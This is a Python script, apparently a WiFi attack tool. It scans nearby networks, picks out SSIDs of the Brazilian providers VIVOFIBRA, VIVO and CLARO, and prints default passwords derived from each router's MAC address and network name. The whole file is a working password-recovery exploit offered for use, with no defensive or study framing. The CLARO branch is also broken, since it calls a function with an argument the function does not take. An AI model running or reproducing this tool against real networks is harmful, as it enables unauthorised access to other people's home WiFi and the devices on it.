import argparse
import socket
import wifi


def get_wifi_info(interface):
  try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sockfd = sock.fileno()
    iw_cells = wifi.Cell.all(interface)
    wifi_info = [(cell.ssid, cell.address) for cell in iw_cells]
    return wifi_info
  except FileNotFoundError:
    print("Error: Unable to get WiFi information. Check if your interface name is correct.")
  except Exception as e:
    print(f"An error occurred: {e}")


def is_vuln(ssid: str) -> bool:
	if 'VIVOFIBRA-' in ssid or 'CLARO' in ssid or 'VIVO-' in ssid:
		return True
	else:
		return False


def own_vivofibra(ssid: str,mac:str) -> str:
	return mac.replace(":","").lower()[2:8] + ssid.split("-")[1].lower()


def own_vivo(mac: str) -> str:
	return mac.replace(":","").upper()[2:]


def own_claro(mac: str) -> str:
	return mac.replace(":","").upper()[4:]


def wifi_owner(wifi_list: list):
  if wifi_list:
    print("Available WiFi Information:")
    for ssid, mac_address in wifi_list:
      if is_vuln(ssid):
        if 'VIVOFIBRA-' in ssid:
          print(f"  Password: {own_vivofibra(ssid=ssid, mac=mac_address)} \t SSID: {ssid}")
        if 'VIVO-' in ssid:
          print(f"  Password: {own_vivo(mac=mac_address)} \t SSID: {ssid}")
        if 'CLARO-' in ssid:
          print(f"  Password: {own_claro(ssid=ssid, mac=mac_address)} \t SSID: {ssid}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", 
                        default="wlp0s20f3", 
                        help="Specify the network interface (default: wlp0s20f3)")
    
    args = parser.parse_args()
    wifi_owner(get_wifi_info(args.interface))
